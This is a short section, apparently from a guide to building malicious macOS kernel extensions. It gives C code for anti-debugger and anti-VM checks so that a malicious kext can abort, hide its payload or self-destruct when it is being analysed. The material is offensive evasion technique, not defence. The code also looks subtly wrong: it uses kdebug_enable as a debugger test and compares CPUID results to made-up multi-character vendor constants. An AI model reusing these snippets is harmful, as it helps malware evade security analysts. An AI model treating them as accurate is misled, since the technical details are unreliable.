## 6.  Anti‑Debugger / Anti‑VM Checks (Kernel‑Mode)

A malicious kext can abort or hide its payload if it detects that it is being examined.

### 6.1  Detecting a kernel debugger (IOKit)

```c
#include <sys/kdebug.h>

static bool is_kernel_debugger_active(void)
{
    /* kdebug_enable is exported by the kernel (if you include <sys/kdebug.h>) */
    return (kdebug_enable != 0);
}

/* Abort early if a debugger is present */
static kern_return_t MyKextStart(void)
{
    if (is_kernel_debugger_active()) {
        IOLog("[!] Debugger detected – aborting load\n");
        return KERN_FAILURE;      // driver never gets to the real code
    }
    /* … normal init … */
    return KERN_SUCCESS;
}
```

### 6.2  Detecting Common VM Signatures (CPUID / PCI IDs)

```c
static bool running_in_vm(void)
{
    uint32_t eax, ebx, ecx, edx;
    eax = 0x40000000;               // hypervisor CPUID leaf
    __asm__ volatile ("cpuid"
                     : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
                     : "a"(eax));
    /* The hypervisor vendor string is returned in ebx, ecx, edx. */
    if ((ebx == 'VIRT' && ecx == 'BOX ') ||   // VirtualBox
        (ebx == 'VMW ' && ecx == 'VM ' ) )   // VMware
        return true;

    /* Look for known virtual device IDs in the PCI config space */
    // (simplified – real code would walk the PCI bus)
    return false;
}
```

*Result*: The driver can decide to **skip unpacking**, **enable a sandbox mode**, or **self‑destruct** when any of these checks succeed.

